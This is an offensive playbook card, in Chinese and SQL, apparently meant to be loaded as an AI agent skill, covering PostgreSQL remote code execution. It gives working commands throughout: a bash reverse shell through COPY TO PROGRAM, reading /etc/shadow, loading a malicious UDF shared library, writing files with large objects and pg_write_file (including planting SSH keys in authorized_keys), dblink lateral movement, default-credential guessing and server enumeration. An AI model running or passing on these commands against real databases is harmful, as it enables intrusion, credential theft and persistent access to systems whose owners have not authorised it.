---
name: 'postgresql-rce'
description: 'PostgreSQL RCE全路径：COPY FROM PROGRAM/UDF扩展/Large Object读写/pg_read_file/CVE-2019-9193'
disable-model-invocation: true
metadata: { domain: db, tier: T2 }
---
> 📌 DSH 用法：用 skill 工具按名加载本卡。

## PostgreSQL RCE 攻击

### 识别
- 端口 5432 对外开放
- 弱密码/默认凭据: `postgres:postgres`, `postgres:password`

### 路径 A: COPY FROM PROGRAM（9.3+，需要 superuser）
```sql
-- 直接执行命令
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"';

-- 读文件
COPY (SELECT '') TO PROGRAM 'cat /etc/shadow';

-- 写文件
COPY (SELECT 'base64 blob') TO PROGRAM 'base64 -d > /tmp/shell';

-- 如果 COPY 被禁用 → 尝试 CREATE TABLE + COPY
CREATE TABLE cmd_output(output TEXT);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;
```text

### 路径 B: UDF 扩展（9.3+，需要 superuser + 编译环境）
```sql
-- 编译共享库
-- Kali: searchsploit -m 1518  (raptor_udf.c 改 pg 版本)
-- 或者: git clone https://github.com/Dionach/postgres_udf_help

-- 上传 so 到 /tmp（写二进制文件用 lo_from_bytea + lo_export，见路径 C）
SELECT lo_export(lo_from_bytea(0, decode('BASE64_OF_SO', 'base64')), '/tmp/pg_udf.so');

-- 加载并执行
CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/pg_udf.so', 'sys_eval' LANGUAGE c STRICT;
SELECT sys_eval('id');
```text

### 路径 C: Large Objects (lo_*) 文件读写
```sql
-- 读文件
SELECT lo_import('/etc/passwd');
SELECT lo_get(loid);

-- 写文件
SELECT lo_from_bytea(0, decode('base64payload', 'base64'));
SELECT lo_export(loid, '/tmp/outfile');
```text

### 路径 D: pg_read_file / pg_write_file（PG ≥ 9.3，superuser）
```sql
-- 读文件
SELECT pg_read_file('/etc/passwd', 0, 1000);

-- 写文件 (.pgpass, authorized_keys 等)
SELECT pg_write_file('/home/user/.ssh/authorized_keys', 'ssh-ed25519 AAAAC3N...');
```text

### 路径 E: dblink 扩展 → 出网横向
```sql
CREATE EXTENSION dblink;
SELECT dblink_connect('host=internal-server port=5432 user=postgres password=pass dbname=postgres');
SELECT * FROM dblink('SELECT 1') AS t(i INT);
-- → 横向移动
```text

### 路径 F: CVE-2019-9193（特定版本 RCE）
```sql
-- PostgreSQL 9.3-11.2 在特定条件下
COPY (SELECT '') TO PROGRAM 'id';
-- 如果权限不足 → 提权需 superuser 或 CREATEROLE
```text

### 枚举
```bash
# 连接
psql -h target -U postgres -d postgres

# 版本
SELECT version();

# 当前用户
SELECT current_user;
SELECT session_user;

# 数据库列表
\l

# 所有用户/角色
\du
SELECT usename, usesuper FROM pg_user;

# 权限
SELECT * FROM pg_roles;
SHOW data_directory;
```text
